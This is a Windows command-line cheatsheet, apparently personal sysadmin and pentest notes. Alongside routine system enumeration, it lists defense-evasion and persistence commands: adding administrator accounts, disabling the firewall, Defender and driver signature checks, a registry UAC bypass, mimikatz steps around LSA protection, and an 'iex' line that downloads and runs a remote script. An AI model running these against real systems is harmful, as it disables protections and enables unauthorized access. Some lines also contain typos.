---
layout: post
title: Sysadmin WIN CLI
category: Sysadmin
parent: Sysadmin
grand_parent: Cheatsheets
modified_date: 2023-06-03
permalink: /sys/win
---

**MENU**

<!-- vscode-markdown-toc -->
* [enum](#enum)
	* [get-os](#get-os)
	* [get-kb](#get-kb)
	* [get-netconf](#get-netconf)
	* [get-shares](#get-shares)
	* [get-users](#get-users)
	* [get-products](#get-products)
	* [get-processes](#get-processes)
	* [get-services](#get-services)
	* [get-sessions](#get-sessions)
	* [last-sessions](#last-sessions)
* [enum-sec](#enum-sec)
	* [get-status-fw](#get-status-fw)
	* [get-status-defender](#get-status-defender)
	* [get-status-cred-guard](#get-status-cred-guard)
	* [get-status-ppl](#get-status-ppl)
* [tamper](#tamper)
	* [add-account](#add-account)
	* [set-kb](#set-kb)
	* [set-netconf](#set-netconf)
	* [set-rdp](#set-rdp)
	* [set-winrm](#set-winrm)
	* [set-smbv1](#set-smbv1)
	* [unset-fw](#unset-fw)
	* [unset-defender](#unset-defender)
	* [unset-cred-guard](#unset-cred-guard)
	* [unset-ppl](#unset-ppl)
	* [unset-sigcheck](#unset-sigcheck)
	* [dl-ps-ad-module](#dl-ps-ad-module)
* [harden](#harden)
	* [disable-llmnr](#disable-llmnr)
	* [disable-ms-msdt](#disable-ms-msdt)
* [bypass](#bypass)
	* [bypass-uac](#bypass-uac)
	* [bypass-lsaprotection](#bypass-lsaprotection)
	* [bypass-sources](#bypass-sources)
* [misc](#misc)
	* [run](#run)
	* [dism](#dism)
	* [wsl](#wsl)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

**ALSO**

* [windows logs](/sys/logs-win/)


## <a name='enum'></a>enum
### <a name='get-os'></a>get-os
```powershell
# listing OS version
wmic os list brief
wmic os get MUILanguages
```

### <a name='get-kb'></a>get-kb
```
# listing KB wmi
wmic qfe list full /format:table

# listing KB ps
powershell -Command "systeminfo /FO CSV" | out-file C:\Windows\Temp\systeminfo.csv
import-csv C:\Windows\Temp\systeminfo.csv | ForEach-Object{$_."Correctif(s)"}
```

### <a name='get-netconf'></a>get-netconf
```powershell
# listing network hardware
wmic nic list brief
ipconfig /all

# listing network software 
wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress
ipconfig /all
route -n
netstat -ano
```

### <a name='get-shares'></a>get-shares
```
# listing network shares
wmic netuse list brief
net use

wmic share
net share

# listing the domain controllers
nltest /dclist:dom.corp
```

### <a name='get-users'></a>get-users
```powershell
# listing local users
wmic netlogin list brief
net user
net localgroup
net localgroup Administrators
```

### <a name='get-products'></a>get-products
```powershell
# listing windows product
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:csv
```

### <a name='get-processes'></a>get-processes
```powershell
# listing windows services 
wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:csv
# winrm service
Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
```

### <a name='get-services'></a>get-services
```powershell
# listing windows processes
wmic process get CSName,Description,ExecutablePath,ProcessId /format:csv
```

### <a name='get-sessions'></a>get-sessions
```batch
# listing the active sessions
quser

# killing a session / below '2' is the session ID
logoff 2
```

### <a name='last-sessions'></a>last-sessions
```powershell
# global view
wmic netlogin get Name,LastLogon,LastLogoff,NumberOfLogons,BadPasswordCount

# backlog of the security eventlogs
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Security-Auditing"; id=4624} -Oldest -Max 1 | Select TimeCreated

# user timeline based on the security eventlogs
$ztarg_usersid=''
$ztarg_username='' #username only, no '$zdom\' prefix
Get-WinEvent -FilterHashtable @{'Logname'='Security';'id'=4624,4634} -Max 80 | Where-Object -Property Message -Match $ztarg_username|  select ID,TaskDisplayName,TimeCreated
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4624,4634;Data=$ztarg_usersid} -Max 80 |  select ID,TaskDisplayName,TimeCreated
```

## <a name='enum-sec'></a>enum-sec

### <a name='get-status-fw'></a>get-status-fw
```batch
# logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
netsh advfirewall show allprofiles
netsh firewall show portopening
```

### <a name='get-status-defender'></a>get-status-defender
```batch
Get-MpComputerStatus
powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
```

### <a name='get-status-cred-guard'></a>get-status-cred-guard

Run the following powershell commands as local administrator:

```powershell
powershell -ep bypass
# if DWORD value named LsaCfgFlags is set to :
#  - 0 is disabled
#  - 1 then Windows Defender Credential Guard is enabled with UEFI lock
#  - 2 then Windows Defender Credential Guard enabled without lock
dir HKLM:\SYSTEM\CurrentControlSet\Control\Lsa*
# if DWORD value named EnableVirtualizationBasedSecurity is set to : 
#  - 0 then virtualization-based security is disabled
#  - 1 then virtualization-based security is enabled
# if DWORD value named RequirePlatformSecurityFeatures is set to :
#  - 1 then Secure Boot only 
#  - 3 then Secure Boot and DMA protection
dir HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard*
```

Reference :
 - [MSDN - Credential Guard Management](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)

### <a name='get-status-ppl'></a>get-status-ppl

## <a name='tamper'></a>tamper

### <a name='add-account'></a>add-account
```batch
# create a local user account
net user /ADD test test

# create a local user account and prompt for the pwd
net user /ADD test *

# create a domain user account prompt for the pwd
net user /ADD test * /DOMAIN

# add the new user to administrators
net localgroup Administrators test /ADD
net localgroup Administrators corp\test /ADD

```
### <a name='set-kb'></a>set-kb
```powershell
Set-WinUserLanguageList -Force "fr-FR"
Set-WinUserLanguageList -Force "en-US"
```

### <a name='set-netconf'></a>set-netconf
```batch
netsh interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
netsh interface ip add dns "connection name" 8.8.8.8
```

### <a name='set-rdp'></a>set-rdp

```powershell
net localgroup "Remote Desktop Users" $zlat_user /add
```

Learn about session stealing at [hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp#session-stealing)

### <a name='set-winrm'></a>set-winrm
```powershell
# client: check winrm service status
Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
Get-Item wsman:\localhost\Client\TrustedHosts

# client: activate winrm and trustedhosts
Start-Service WinRM
Set-Service WinRM -StartMode Automatic
Set-Item wsman:\localhost\client\trustedhosts -Value *

# server
Enable-PSRemoting
```

### <a name='set-smbv1'></a>set-smbv1
```powershell
# DISM 
DISM /online /enable-feature /featurename:SMB1Protocol
DISM /online /enable-feature /featurename:SMB1Protocol-Client
DISM /online /enable-feature /featurename:SMB1Protocol-Server
DISM /online /enable-feature /featurename:SMB1Protocol-Deprecation

# win10 tampering: PS activate SMBv1 OptionalFeatures
Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol
```

### <a name='unset-fw'></a>unset-fw
```batch
netsh advfirewall set publicprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set allprofiles state off
```

### <a name='unset-defender'></a>unset-defender
```batch
powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
```

### <a name='unset-cred-guard'></a>unset-cred-guard 
```powershell
```

### <a name='unset-ppl'></a>unset-ppl

Tools that disable PPL flags on the LSASS process by patching the EPROCESS kernel 
 - [PPLFault](https://github.com/gabriellandau/PPLFault)
 - [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
 - [PPLdump](https://github.com/itm4n/PPLdump)
 - [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)


```batch
```

### <a name='unset-sigcheck'></a>unset-sigcheck

Windows driver signature: disable:
```batch
bcdedit.exe /set nointegritychecks on
bcdedit.exe /set testsigning on
```


### <a name='dl-ps-ad-module'></a>dl-ps-ad-module 
```batch
#version 1
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

## <a name='harden'></a>harden
### <a name='disable-llmnr'></a>disable-llmnr
```
REG ADD  “HKLM\Software\policies\Microsoft\Windows NT\DNSClient”
REG ADD  “HKLM\Software\policies\Microsoft\Windows NT\DNSClient” /v ”EnableMulticast” /t REG_DWORD /d “0” /f
```
### <a name='disable-ms-msdt'></a>disable-ms-msdt
```
# MS-MSDT protocol used by follina exploit, CVE-2022-30190
RED DEL "HKEY_CLASSES_ROOT\ms-msdt" /f
```

## <a name='bypass'></a>bypass

### <a name='bypass-uac'></a>bypass-uac
```batch
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
```

### <a name='bypass-lsaprotection'></a>bypass-lsaprotection
```batch
powershell .\ConsoleApplication1.exe/InstallDriver
powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
powershell .\mimikatz.exe
```

### <a name='bypass-sources'></a>bypass-sources

- [Windows command-line obfuscation](https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation)
- [powershell obfuscation using securestring](https://www.wietzebeukema.nl/blog/powershell-obfuscation-using-securestring)

## <a name='misc'></a>misc

### <a name='run'></a>run

| Name	 | Function |
|--------|-------------|
| Add/Remove Programs	 | appwiz.cpl |
| Administrative Tools	 | control admintools |
| Automatic Updates	| wuaucpl.cpl |
| Bluetooth Transfer wizard	 | fsquirt |
| Certificate Manager	| certmgr.msc |
| Character Map	| charmap |
| Control Panel	| control |
| Computer Management	| compmgmt.msc |
| Date and Time Properties | timedate.cpl |
| Driver Verifier Utility | verifier |
| Event Viewer	| eventvwr.msc |
| File Signature Verification Tool	| sigverif |
| Group Policy Editor | gpedit.msc |
| Logs out of windows | logoff |
| Malicious Software Removal Tool	| mrt |
| Monitors Display | desk.cpl |
| Network Connections	| ncpa.cpl |
| Password Properties	| password.cpl |
| Performance Monitor	| perfmon.msc |
| Registry Editor	| regedit |
| Remote Desktop	| mstsc |
| Security Center	wscui.cpl
| Sounds and Audio	| mmsys.cpl |
| Shuts Down Windows | shutdown |
| SQL Client Configuration	| cliconfg |
| System Configuration Utility	| msconfig |
| Task Manager	| taskmgr |
| Task Scheduler | taskschd.msc |
| User Account Management | nusrmgr.cpl |
| Windows Firewall	| firewall.cpl |
| Windows Version | winver |
| Wordpad | Write |

### <a name='dism'></a>dism
```powershell
# Pre requisites: Admin rights
# get all windows feature and save to a txt file
DISM /online /get-features /format:table > C:\Temp\dism_listing.txt
get-windowsoptionalfeature -online | ft | more

# get windows feature that are enable/disable
DISM /online /get-features /format:table | find “Enabled” | more
DISM /online /get-features /format:table | find “Disabled” | more

# get windows feature by its name
DISM /online /get-featureinfo /featurename:Microsoft-Windows-Subsystem-Linux
DISM /online /get-featureinfo /featurename:TelnetClient
get-windowsoptionalfeature -online -featurename SMB1Protocol*
get-windowsoptionalfeature -online -featurename SMB1Protocol* |ft
```

### <a name='wsl'></a>wsl
Windows WSL manual distro install
```powershell
# Note: By pass the GPO blocking the exec of the App Store app

Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
New-Item C:\Ubuntu -ItemType Directory
Set-Location C:\Ubuntu
Invoke-WebRequest -Uri https://aka.ms/wsl-ubuntu-1604 -OutFile Ubuntu.appx -UseBasicParsing
Invoke-WebRequest -Uri https://aka.ms/wslubuntu2004 -OutFile Ubuntu.appx -UseBasicParsing
Invoke-WebRequest -Uri https://aka.ms/wsl-kali-linux-new -OutFile Kali.appx -UseBasicParsing
 
# Extract and execute the EXE in the archive to install the distro
Rename-Item .\Ubuntu.appx Ubuntu.zip
Expand-Archive .\Ubuntu.zip -Verbose
Ubuntu.exe

# List the distributions installed
wslconfig /list /all
wsl -l
```